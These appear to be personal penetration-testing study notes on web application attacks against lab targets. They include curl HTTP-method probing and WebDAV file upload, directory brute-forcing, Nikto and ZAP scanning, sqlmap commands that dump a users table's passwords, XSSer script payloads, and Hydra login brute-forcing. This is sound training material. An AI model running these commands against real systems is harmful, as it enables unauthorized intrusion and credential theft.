
##### Web and HTTP protocol (enumerate HTTP methods)

HTTP Methods 
- **GET**
- **POST**
- **PUT**
- **HEAD**
- **DELETE**
- **PATCH**
- **OPTIONS**
- **CONNECT**
- **TRACK**
  
- Use inspector to inspect logon page (method and where it is send)
- dirb for directory busting (find hidden direcotries):
	- `dirb http://ip `
- Check what options are possible for the webfiles/directories found with dir: 
	- `curl -X GET ip `
	- `curl -I ip ` (HEAD)
	- `curl -X OPTIONS ip -v`
	- `curl -X PUT ip `
	- `curl -X OPTIONS ip/loging.php -v `
	- `curl -X POST ip `
	- `curl -X HEAD ip`
	- `curl -X POSt ip/login.php -d "name=john&password=password" -v` 
	- `curl -X OPTIONS ip/page_of_interest -v `
	- `curl -XPUT ip `
	- `curl -XDELETE ip/uploads/file.txt`

The Webdav module is enabled on the Apache Server, Webdav module allows file upload via PUT method
PUT method. ![[Pasted image 20230928141102.png]]

If PUT is possible: `curl ip/uploads/ --upload-file file.txt`

-- 

To use Burp to find the HTTP methods allowd: 
send request to repeater and change the method in the request:
![[Pasted image 20230928141257.png]]
![[Pasted image 20230928141341.png]]

##### Directory enumeration with GoBuster 


- similar to dirb 
- `gobuster`  (manual)
- `gobuster dir -u http://ip -w /usr/share/wordlist/dirb/common.txt `
- `gobuster dir -u http://ip -w /usr/share/wordlist/dirb/common.txt -b 403,404 ` (filter out 403 and 404)
- scan for specific file extensions: .php, .xml, .txt: `gobuster dir -u http://192.156.207.3 -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r``



##### Directory Enumeration with Burp Suite 

- turn on proxyfox 
- Action - send to intruder 
- check target 
- intruder (positions)
- change get request ` Get /$name$` ![[Pasted image 20230926152712.png]] 
	- Sniper (directly) Attack type are different 
- Payloads
	- Add: data, passwords, phphmyadmin, js, images, 
	- load wordlist from kali: wordlists/dirb/common




GET /§name§ HTTP/1.0
Cookie: c=cval
Content-Length: 17


##### Scanning Web Application with ZAProxy 

- run nmap scan 
open owasp zap 
click around on website to collect data 
![[Pasted image 20230926180039.png]]

Select form based authentication
![[Pasted image 20230926180141.png]]
Make sure user mode is enabled 
Use the spider to do enumaration 

##### Scanning web Applications with Nikto 

- `ping` and `nmap` for port 80 
- `nikto` 
- `nikto -Help `
- `nikto -h http://ip `
- `nikto -h http://ip/full_url -Tuning 5 -Display V
- `nikto -h http://ip/full_url -Tuning 5 -Display V -o nikto-results.hthml -Format html' 


##### Passive Crawling with Burp Suite 

- pull up http server with webbrowser 
- turn on burpsuite with foxyproxy
- check http history 
- target shows tree of site map 
- add the ip you test to the scope 


##### SQL Injection with SQLMap 
- run `nmap` 
- turn on foxyproxy 
- turn on burp - intercept on
- `sqlmap` 
- `sqlmap -u "http://ip/sql_1.php?title=joe&action=search" --cookie "PHPSESSID=paste_cookie; security_level=0" -p title `
![[Pasted image 20230926210205.png]]
- get the request in repeater so we can change it and send it again: 
![[Pasted image 20230926210610.png]]
- - `sqlmap -u "http://ip/sql_1.php?title=joe&action=search" --cookie "PHPSESSID=paste_cookie; security_level=0" -p title -D bWapp --tables `
- `sqlmap -u "http://ip/sql_1.php?title=joe&action=search" --cookie "PHPSESSID=paste_cookie; security_level=0" -p title -D bWapp -T users --columns `
- `sqlmap -u "http://ip/sql_1.php?title=joe&action=search" --cookie "PHPSESSID=paste_cookie; security_level=0" -p title -D bWapp -T users -C admin,passwords,email`



Generate new payloads - use payloads in repeater in burp 
- `sqlmap -r request -p title ` 




##### XSS Attack with XSSer

- visit 80 in browser 
- turn on foxyproxy 
- `xxser`
- `xsser -url "http://ip/index.php?page=dns-lookup.php" -p "payload" --auto ` (change payload to payload)
	- add custom script with: `--Fp "<script>alert(1)</script>"`
- scan page: `xsser -url "http://ip/index.php?PAGE_OF_INTREST"
**CHANGE YOU VARIABLE WITH XSS**
![[Pasted image 20230926212948.png]]










##### Authenticated XSS Attack with XSSer 

We need a cookie to try authenticated session 
Script is interpreted 
![[Pasted image 20230926213430.png]]

Use xsser to find out if its vulnerable for XSS
- `xsser` 
- `xsser -url "http://ip/path?firstanem=XSS&etc" --cookie"security_level=0; PHPSESSID=cookie" `
add `<script>alert(1)</script>`


##### Attacking HTTP Login From with Hydra 

- `hydra` 
  view page source to see what the post request for login is asking for and add that to the hydra command
- `hydra -L users_list -P passwords_list target_ip http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:reply_that_hydra_should_belookingfor




##### Attacking Basic Auth with Burp Suite 


- visti: `http://ip/basic`
![[Pasted image 20230926214941.png]]
Everything will be encrypted in base64 
![[Pasted image 20230926215015.png]]
add payload with wordlist - payload processing: add prefix admin: - encoded base 64 - 
decode in burp 
(smartdecode)
![[Pasted image 20230926215259.png]]



##### Attacking HTTP Login From ZAProxy 

- open owasp zap in kali (zaproxy)
- manual explore enter the ip and launch browser 
- try a login to capture the traffic 
- use the POST request with the login - right click and fuzz 
- load wordlist (select the username or password and Add)
- start fuzzer 


/fil